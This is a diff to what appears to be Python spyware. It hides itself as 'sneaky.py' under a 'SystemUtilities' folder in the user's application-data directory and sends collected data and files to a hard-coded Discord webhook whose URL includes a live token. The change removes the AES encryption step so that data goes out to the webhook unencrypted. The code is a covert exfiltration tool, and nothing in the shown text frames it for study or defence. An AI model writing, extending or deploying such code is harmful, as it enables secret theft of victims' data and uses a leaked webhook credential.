@@ -81,7 +81,6 @@ else:
 WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
 CHUNK_SIZE = 4 * 1024 * 1024
 MAX_FILE_SIZE = 4 * 1024 * 1024
-ENCRYPTION_KEY = b"autojug1234567890"
 HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~\\Application Data")), "SystemUtilities") if IS_WINDOWS else os.path.expanduser("~/Library/Application Support/SystemUtilities") if IS_MAC else os.path.expanduser("~/.config/SystemUtilities")
 HIDE_FILE = os.path.join(HIDE_DIR, "sneaky.py")
 PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
@@ -126,30 +125,7 @@ def ensure_dependencies():
                     time.sleep(5)
     return True
 
-# Encryption and Decryption
-def encrypt(data):
-    try:
-        from Cryptodome.Cipher import AES
-        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX)
-        nonce = cipher.nonce
-        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
-        return base64.b64encode(nonce + ciphertext).decode()
-    except Exception as e:
-        logging.error(f"Encryption error: {e}")
-        return data
-
-def decrypt(encrypted_data):
-    try:
-        from Cryptodome.Cipher import AES
-        raw = base64.b64decode(encrypted_data)
-        nonce, ciphertext = raw[:16], raw[16:]
-        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
-        return cipher.decrypt(ciphertext).decode()
-    except Exception as e:
-        logging.error(f"Decryption error: {e}")
-        return encrypted_data
-
-# Discord Webhook Sending with Random Delay
+# Discord Webhook Sending (Unencrypted)
 def send_to_discord(data, file_path=None):
     if file_path and os.path.getsize(file_path) <= MAX_FILE_SIZE:
         try:
@@ -161,9 +137,9 @@ def send_to_discord(data, file_path=None):
         except Exception as e:
             logging.error(f"Discord file send error: {e}")
         return
-    encrypted_data = encrypt(data)
-    for i in range(0, len(encrypted_data), CHUNK_SIZE):
-        chunk = encrypted_data[i:i + CHUNK_SIZE]
+    # Removed encryption, sending raw data
+    for i in range(0, len(data), CHUNK_SIZE):
+        chunk = data[i:i + CHUNK_SIZE]
         try:
             requests.post(WEBHOOK_URL, json={"content": chunk}, timeout=5)
         except requests.exceptions.RequestException:
